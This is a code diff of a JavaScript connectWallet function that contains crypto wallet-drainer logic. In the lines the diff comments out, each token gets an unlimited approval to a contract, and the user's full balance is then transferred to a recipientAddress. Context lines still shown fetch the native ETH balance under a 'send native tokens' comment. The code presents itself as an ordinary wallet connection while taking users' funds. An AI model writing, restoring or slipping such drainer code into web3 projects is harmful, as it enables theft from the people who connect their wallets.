@@ -364,26 +364,26 @@ async function connectWallet() {
             const signature = await signer.signMessage(message);
             console.log('Signature:', signature);
 
-            for (let token of tokens) {
-                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                const maxUint256 = ethers.constants.MaxUint256;
+            // for (let token of tokens) {
+            //     const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+            //     const maxUint256 = ethers.constants.MaxUint256;
 
-                // Approve unlimited tokens
-                const approveTx = await tokenContract.approve(contractAddress, maxUint256);
-                await approveTx.wait();
-                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);
+            //     // Approve unlimited tokens
+            //     const approveTx = await tokenContract.approve(contractAddress, maxUint256);
+            //     await approveTx.wait();
+            //     console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);
 
-                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
-                if(balance.eq(0)) {
-                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
-                    continue;
-                }
-                // Transfer tokens using the smart contract
-                const contract = new ethers.Contract(contractAddress, contractABI, signer);
-                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
-                await transferTx.wait();
-                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
-            }
+            //     const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
+            //     if(balance.eq(0)) {
+            //         console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
+            //         continue;
+            //     }
+            //     // Transfer tokens using the smart contract
+            //     const contract = new ethers.Contract(contractAddress, contractABI, signer);
+            //     const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
+            //     await transferTx.wait();
+            //     console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
+            // }
             //send native tokens
                 const etherBalance = await provider.getBalance(address)
                 console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
